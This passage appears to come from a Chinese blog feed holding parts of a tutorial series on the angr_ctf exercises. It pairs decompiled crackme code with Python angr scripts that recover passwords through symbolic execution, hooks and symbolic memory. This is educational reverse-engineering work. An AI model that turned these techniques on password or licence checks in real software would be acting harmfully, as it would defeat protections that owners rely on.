class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">  filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">  main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="phook-scanf-han-shu">Hook scanf函数</span><a href="#phook-scanf-han-shu" class="header-anchor">#</a></h3><ul><li><code>11_angr_sim_scanf</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">cint __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">4</span>]; <span class="comment">// [esp+28h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+2Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x14</span>u);</span><br><span class="line">  *(_DWORD *)s = <span class="number">1329940303</span>;</span><br><span class="line">  v7 = <span class="number">1179340618</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], i);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u %u"</span>, buffer0, buffer1);</span><br><span class="line">  v3 = !<span class="built_in">strncmp</span>(buffer0, s, <span class="number">4u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v7, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面很像，但这次需要hook我们最常用的scanf函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,format_string,buffer0_addr,buffer1_addr)</span>:</span></span><br><span class="line">            buffer0 = claripy.BVS(<span class="string">'buffer0'</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            buffer1 = claripy.BVS(<span class="string">'buffer1'</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            self.state.memory.store(buffer0_addr,buffer0,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(buffer1_addr,buffer1,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.globals[<span class="string">'solution0'</span>] = buffer0</span><br><span class="line">            self.state.globals[<span class="string">'solution1'</span>] = buffer1</span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">"__isoc99_scanf"</span></span><br><span class="line">    project.hook_symbol(scanf_symbol,ReplacementScanf())</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.se.eval(solution_state.globals[<span class="string">'solution0'</span>])</span><br><span class="line">        solution1 = solution_state.se.eval(solution_state.globals[<span class="string">'solution1'</span>])</span><br><span class="line">        print(solution0,solution1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">  filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">  main(filepath)</span><br></pre></td></tr></table></figure><p>需要将符号数据存入buffer0和buffer1中，同时由于变量在对象内声明并且最后需要在对象外使用，因此通过state类的globals实现存取</p><h3><span id="pveritesting-mo-shi">Veritesting模式</span><a href="#pveritesting-mo-shi" class="header-anchor">#</a></h3><ul><li><code>12_angr_veritesting</code></li></ul><p><code>veritesting</code>是一个符号执行的选项，使用路径融合来解决路径爆炸的问题，例如前面一个字符一个字符比较的情况</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pzai-jing-tai-bian-yi-de-er-jin-zhi-zhong-jin-xing-hook">在静态编译的二进制中进行Hook</span><a href="#pzai-jing-tai-bian-yi-de-er-jin-zhi-zhong-jin-xing-hook" class="header-anchor">#</a></h3><ul><li><code>13_angr_static_binary</code></li></ul><p>在符号执行时，遇到一些libc中的函数，angr其实都会帮我们hook掉，不然会影响符号执行的速度。所以这里通过实例让我们自己试试使用angr的功能Hook一下，angr已经实现的hook如下：</p><p><a href="https://github.com/angr/angr/tree/master/angr/procedures/libc" target="_blank" rel="noopener">https://github.com/angr/angr/tree/master/angr/procedures/libc</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state,veritesting=<span class="literal">True</span>)</span><br><span class="line">    project.hook(<span class="number">0x804EF40</span>,angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'printf'</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804EF80</span>,angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'scanf'</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804F550</span>,angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'puts'</span>]())</span><br><span class="line">    project.hook(<span class="number">0x80491F0</span>,angr.SIM_PROCEDURES[<span class="string">'glibc'</span>][<span class="string">'__libc_start_main'</span>]())</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="phook-zi-ding-yi-de-dong-tai-lian-jie-ku">Hook自定义的动态链接库</span><a href="#phook-zi-ding-yi-de-dong-tai-lian-jie-ku" class="header-anchor">#</a></h3><ul><li><code>14_angr_shared_library</code></li></ul><p>这里需要我们Hook自定义的动态链接库中的函数，这里不需要我们去执行这个二进制文件，而是直接通过angr对动态库<code>lib14_angr_shared_library.so</code>中的<code>validate</code>函数进行符号执行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line">    validate_addr_offset = <span class="number">0x6D7</span></span><br><span class="line">    project = angr.Project(filepath, load_options=&#123;</span><br><span class="line">        <span class="string">'main_opts'</span>: &#123;</span><br><span class="line">            <span class="string">'custom_base_addr'</span>: base</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    password_addr = claripy.BVV(<span class="number">0xffffff00</span>, <span class="number">32</span>)  <span class="comment"># pointer</span></span><br><span class="line">    validate_addr = base + validate_addr_offset</span><br><span class="line"></span><br><span class="line">    init_state = project.factory.call_state(</span><br><span class="line">        validate_addr, password_addr, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">    password = claripy.BVS(<span class="string">"password"</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">    init_state.memory.store(password_addr, password)</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line">    success_addr = base+<span class="number">0x783</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=success_addr)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>) </span><br><span class="line">        solution = solution_state.se.eval(password,cast_to = bytes) </span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><p>之前的hook我们都知道函数的地址，而在动态库中，我们没法直接知道地址，所以需要制定base，并传入参数调用函数。由于只对这个函数进行符号执行，所以也要加入符号执行正确时的约束。</p>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着AngrCTF学Angr(1)</title>
    <url>/c8846004.html</url>
    <content><![CDATA[<blockquote><p>最近想跟着angr_ctf学习了一下符号执行（用来在做逆向的时候偷懒），还是挺有收获的</p></blockquote><p><strong>PS</strong>:</p><p><code>angr == 8.20.1.7</code></p><p>二进制文件和脚本存储于<code>https://github.com/ycdxsb/Challenges/tree/master/angr_ctf</code></p><a id="more"></a><h2><span id="pji-ben-shi-yong">基本使用</span><a href="#pji-ben-shi-yong" class="header-anchor">#</a></h2><h3><span id="pchang-gui-shi-yong">常规使用</span><a href="#pchang-gui-shi-yong" class="header-anchor">#</a></h3><ul><li><code>00_angr_find</code></li><li><code>01_angr_avoid</code></li></ul><p>简单设置目标地址和不想达到的地址即可，可以是单个地址也可以是很多地址，所以这里都用列表统一了一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line">    find = [<span class="number">0x8048678</span>]</span><br><span class="line">    avoid = []</span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pshe-zhi-pan-duan-han-shu">设置判断函数</span><a href="#pshe-zhi-pan-duan-han-shu" class="header-anchor">#</a></h3><ul><li><code>02_angr_find_condition</code></li></ul><p>对于一些情况，我们不需要去仔细分析要避免或者搜索哪些分支，只知道正确会输出什么，错误会输出什么，这个时候可以使用判断函数代替之前的地址列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h2><span id="pfu-hao-hua-du-ru">符号化读入</span><a href="#pfu-hao-hua-du-ru" class="header-anchor">#</a></h2><p>由于angr不能处理复杂的scanf读入情况，因此要自己越过scanf对scanf后的状态赋值，并从scanf后开始执行</p><h3><span id="pfu-hao-hua-ji-cun-qi">符号化寄存器</span><a href="#pfu-hao-hua-ji-cun-qi" class="header-anchor">#</a></h3><ul><li><code>03_angr_symbolic_registers</code></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048882                 call    _printf</span><br><span class="line">.text:08048887                 add     esp, 10h</span><br><span class="line">.text:0804888A                 call    get_user_input</span><br><span class="line">.text:0804888F                 mov     [ebp+var_14], eax</span><br><span class="line">.text:08048892                 mov     [ebp+var_10], ebx</span><br><span class="line">.text:08048895                 mov     [ebp+var_C], edx</span><br><span class="line">.text:08048898                 sub     esp, 0Ch</span><br></pre></td></tr></table></figure><p>可以看到在get_user_input函数执行后，读入的三个数字分别存在eax,ebx和edx中，因此我们越过get_user_input函数开始执行，并且将其中的eax,ebx,edx赋值成angr中的符号即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x804888F</span></span><br><span class="line">    </span><br><span class="line">    init_state = project.factory.blank_state(addr = start_address)</span><br><span class="line">    password_bits = <span class="number">32</span></span><br><span class="line">    password0 = claripy.BVS(<span class="string">'password0'</span>, password_bits)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">'password1'</span>, password_bits)</span><br><span class="line">    password2 = claripy.BVS(<span class="string">'password2'</span>, password_bits)</span><br><span class="line">    init_state.regs.eax = password0</span><br><span class="line">    init_state.regs.ebx = password1</span><br><span class="line">    init_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = format(solution_state.se.eval(password0),<span class="string">'x'</span>)</span><br><span class="line">        solution1 = format(solution_state.se.eval(password1),<span class="string">'x'</span>)</span><br><span class="line">        solution2 = format(solution_state.se.eval(password2),<span class="string">'x'</span>)</span><br><span class="line">        print(solution0,solution1,solution2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-zhan">符号化栈</span><a href="#pfu-hao-hua-zhan" class="header-anchor">#</a></h3><ul><li><code>04_angr_symbolic_stack</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">handle_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">"%u %u"</span>, &amp;v2, &amp;v1);</span><br><span class="line">  v2 = complex_function0(v2);</span><br><span class="line">  v1 = complex_function1(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">887024739</span> &amp;&amp; v1 == <span class="number">1261126168</span> )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，以<code>%u</code>格式读入后的数据v1和v2存储在栈上，那么当我们越过scanf开始执行时，不仅要构造符号向量，也要模拟函数执行前的栈。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048697</span></span><br><span class="line"></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    init_state.regs.ebp = init_state.regs.esp</span><br><span class="line"></span><br><span class="line">    init_state.regs.esp -= <span class="number">8</span></span><br><span class="line">    password0 = claripy.BVS(<span class="string">'password0'</span>, <span class="number">32</span>)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">'password1'</span>, <span class="number">32</span>)</span><br><span class="line">    init_state.stack_push(password0)</span><br><span class="line">    init_state.stack_push(password1)</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.se.eval(password0)</span><br><span class="line">        solution1 = solution_state.se.eval(password1)</span><br><span class="line">        print(solution0, solution1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-bss">符号化bss</span><a href="#pfu-hao-hua-bss" class="header-anchor">#</a></h3><ul><li><code>05_angr_symbolic_memory</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%8s %8s %8s %8s"</span>, user_input, &amp;unk_B368DA8, &amp;unk_B368DB0, &amp;unk_B368DB8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xB368DA0</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0xB368DA0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">"IIZAUPRCZIZQJGKOJGDEAPHFFOBMNITD"</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 